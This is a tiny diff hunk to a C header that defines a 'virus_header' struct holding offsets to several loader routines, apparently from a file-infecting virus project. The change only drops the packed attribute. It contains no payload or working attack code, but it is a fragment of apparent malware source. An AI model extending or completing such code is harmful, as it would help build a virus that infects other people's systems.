@@ -15,6 +15,6 @@ struct virus_header
 	size_t		dist_vircall_loader;
 	size_t		dist_header_loader;
 	size_t		dist_jmpclient_loader;
-}__attribute__((packed));
+};
 
 #endif
